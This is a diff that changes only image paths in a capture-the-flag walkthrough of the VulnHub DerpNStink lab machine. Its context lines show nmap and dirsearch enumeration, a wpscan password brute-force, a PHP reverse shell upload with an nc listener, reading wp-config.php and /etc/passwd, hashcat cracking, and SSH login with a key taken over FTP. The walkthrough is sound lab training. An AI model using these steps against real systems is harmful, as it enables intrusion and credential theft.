@@ -3,7 +3,7 @@
 - **Machine:** DerpNStink: 1
 - **Download:** https://www.vulnhub.com/entry/derpnstink-1,221/
 
-![](778-1.png)
+![](images/778-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](778-2.png)
+![](images/778-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.247
 ```
 
-![](778-3.png)
+![](images/778-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ This command performs an aggressive scan and uses the `http-enum` NSE script to 
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.247
 ```
 
-![](778-4.png)
+![](images/778-4.png)
 
 ---
 
@@ -79,7 +79,7 @@ Perform directory brute-forcing using Dirsearch.
 dirsearch -u http://192.168.2.247
 ```
 
-![](778-5.png)
+![](images/778-5.png)
 
 ---
 
@@ -101,7 +101,7 @@ Add the virtual host entry.
 nano /etc/hosts
 ```
 
-![](778-6.png)
+![](images/778-6.png)
 
 Visit the virtual host:
 
@@ -116,7 +116,7 @@ Visit the virtual host:
 wpscan --url http://derpnstink.local/weblog -e u
 ```
 
-![](778-7.png)
+![](images/778-7.png)
 
 ---
 
@@ -128,7 +128,7 @@ wpscan --url http://derpnstink.local/weblog -e u
 wpscan --url http://derpnstink.local/weblog --usernames admin --passwords /opt/rockyou.txt
 ```
 
-![](778-8.png)
+![](images/778-8.png)
 
 ### Valid Credentials
 
@@ -171,7 +171,7 @@ Navigate to:
 Slideshow → Manage Slides
 ```
 
-![](778-9.png)
+![](images/778-9.png)
 
 Click **Edit** and upload the PHP shell.
 
@@ -189,11 +189,11 @@ nc -nlvp 443
 
 Upload and execute the PHP payload.
 
-![](778-10.png)
+![](images/778-10.png)
 
 A reverse shell is successfully established.
 
-![](778-11.png)
+![](images/778-11.png)
 
 ---
 
@@ -209,7 +209,7 @@ cd /var/www/html/weblog
 ls
 ```
 
-![](778-12.png)
+![](images/778-12.png)
 
 ---
 
@@ -219,7 +219,7 @@ ls
 cat wp-config.php
 ```
 
-![](778-13.png)
+![](images/778-13.png)
 
 ### Database Credentials
 
@@ -236,7 +236,7 @@ DB_HOST     = localhost
 
 Login using the recovered database credentials.
 
-![](778-14.png)
+![](images/778-14.png)
 
 Navigate to:
 
@@ -244,7 +244,7 @@ Navigate to:
 wordpress → wp_users
 ```
 
-![](778-15.png)
+![](images/778-15.png)
 
 ### User Information
 
@@ -267,7 +267,7 @@ Save the hash.
 echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' > hash.txt
 ```
 
-![](778-16.png)
+![](images/778-16.png)
 
 ---
 
@@ -277,7 +277,7 @@ echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' > hash.txt
 hashcat -m 400 hash.txt /opt/rockyou.txt
 ```
 
-![](778-17.png)
+![](images/778-17.png)
 
 ---
 
@@ -287,7 +287,7 @@ hashcat -m 400 hash.txt /opt/rockyou.txt
 cat /etc/passwd
 ```
 
-![](778-18.png)
+![](images/778-18.png)
 
 ### Users Found
 
@@ -306,7 +306,7 @@ mrderp
 ftp 192.168.2.247
 ```
 
-![](778-19.png)
+![](images/778-19.png)
 
 ---
 
@@ -320,7 +320,7 @@ cd /files/ssh/ssh/ssh/ssh/ssh/ssh/ssh
 ls
 ```
 
-![](778-20.png)
+![](images/778-20.png)
 
 ---
 
@@ -330,9 +330,9 @@ ls
 get key.txt
 ```
 
-![](778-21.png)
+![](images/778-21.png)
 
-![](778-22.png)
+![](images/778-22.png)
 
 ---
 
@@ -348,7 +348,7 @@ ssh-keygen -lf key.txt
 head -1 key.txt
 ```
 
-![](778-23.png)
+![](images/778-23.png)
 
 ---
 
@@ -368,7 +368,7 @@ Authenticate using the downloaded private key.
 ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -i key.txt stinky@192.168.2.247
 ```
 
-![](778-24.png)
+![](images/778-24.png)
 
 Successful SSH access is obtained.
 
